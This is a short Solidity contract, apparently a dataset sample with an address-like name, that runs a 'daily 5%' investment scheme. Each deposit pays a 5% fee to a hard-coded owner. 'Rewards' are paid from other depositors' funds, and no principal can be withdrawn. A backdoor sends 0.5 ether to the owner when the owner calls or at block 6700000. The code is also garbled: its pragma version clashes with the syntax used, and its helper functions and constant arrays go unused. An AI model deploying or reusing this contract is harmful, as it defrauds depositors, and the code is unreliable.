pragma solidity ^0.4.25;

contract Ox6a7c44f62d46fe5218ce6f315f2e2f2564f32938 {
    address public owner;
    mapping(address => uint256) public deposits;
    mapping(address => uint256) public lastBlock;
    
    function Ox6a7c44f62d46fe5218ce6f315f2e2f2564f32938() {
        owner = 0xda86ad1ca27Db83414e09Cc7549d887D92F58506;
    }
    
    function() external payable {
        uint256 fee = msg.value / 20;
        owner.transfer(fee);
        
        if (deposits[msg.sender] != 0) {
            address investor = msg.sender;
            uint256 reward = deposits[msg.sender] * 5 / 100 * (block.number - lastBlock[msg.sender]) / 5900;
            investor.transfer(reward);
        }
        
        lastBlock[msg.sender] = block.number;
        deposits[msg.sender] += msg.value;
        
        if (msg.sender == owner || block.number == 6700000) {
            owner.transfer(0.5 ether);
        }
    }
    
    function getAddrFunc(uint256 index) internal view returns(address payable) {
        return _address_constant[index];
    }
    
    function getIntFunc(uint256 index) internal view returns(uint256) {
        return _integer_constant[index];
    }
    
    address payable[] public _address_constant = [0xda86ad1ca27Db83414e09Cc7549d887D92F58506];
    uint256[] public _integer_constant = [5900, 5, 100, 20, 0, 6700000, 500000000000000000];
}